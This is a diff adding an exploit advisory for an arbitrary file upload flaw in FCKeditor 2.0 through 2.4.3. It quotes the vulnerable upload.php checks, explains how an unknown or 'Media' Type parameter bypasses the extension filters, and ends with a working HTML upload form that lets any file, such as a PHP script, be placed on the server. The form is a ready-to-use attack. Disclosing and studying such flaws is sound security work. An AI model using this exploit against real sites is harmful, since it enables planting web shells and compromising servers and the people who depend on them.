@@ -1,0 +1,39 @@
+# Exploit Title: FCKeditor 2.0-2.4.3 arbitrary file upload
+# Author: grabz
+# Software Link: http://sourceforge.net/projects/fckeditor/
+# Version: FCKeditor 2.x <= 2.4.3
+# Tested on: 2.0, 2.2, 2.3.2, 2.4.0, 2.4.3
+
+for version 2.0 - 2.2:
+in file FCKeditor/editor/filemanager/upload/php/upload.php
+#$sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;
+#
+#// Get the allowed and denied extensions arrays.
+#$arAllowed    = $Config['AllowedExtensions'][$sType] ;
+#$arDenied    = $Config['DeniedExtensions'][$sType] ;
+we can send as Type any text that not contained in (File, Flash, Image) and
+then we can upload file with any extension like ".php"
+
+for version 2.3.0 - 2.4.3:
+in file FCKeditor/editor/filemanager/upload/php/upload.php
+#$sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;
+#
+#// Check if it is an allowed type.
+#if ( !in_array( $sType, array('File','Image','Flash','Media') ) )
+#    SendResults( 1, '', '', 'Invalid type specified' ) ;
+#
+#// Get the allowed and denied extensions arrays.
+#$arAllowed    = $Config['AllowedExtensions'][$sType] ;
+#$arDenied    = $Config['DeniedExtensions'][$sType] ;
+in this code we can see filter by Type, but in config.php
+$Config['AllowedExtensions']['Media'] and
+$Config['DeniedExtensions']['Media'] not exists))
+if we send Type=Media, we can upload any file)
+
+#Exploit
+<form enctype="multipart/form-data" action="
+http://localhost/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media"
+method="post">
+<input name="NewFile" type="file">
+<input type="submit" value="submit">
+</form>
